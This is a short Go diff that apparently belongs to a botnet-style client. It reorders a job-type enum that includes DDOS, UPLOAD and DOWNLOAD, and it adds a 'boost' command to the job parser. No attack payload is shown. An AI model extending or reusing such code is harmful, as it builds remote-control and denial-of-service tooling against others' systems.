@@ -17,8 +17,9 @@ const (
 	UPLOAD
 	DOWNLOAD
 	DDOS
-	SLEEP
 	CHDIR
+	SLEEP
+	BOOST
 )
 
 func parseJob(jobStr string) (JobType, []string) {
@@ -38,6 +39,8 @@ func parseJob(jobStr string) (JobType, []string) {
 		return DOWNLOAD, values
 	} else if jobTypeStr == "sleep" && valuesN == 1 {
 		return SLEEP, values
+	} else if jobTypeStr == "boost" && valuesN == 1 {
+		return BOOST, values
 	}
 	return UNKNOWN, nil
 }
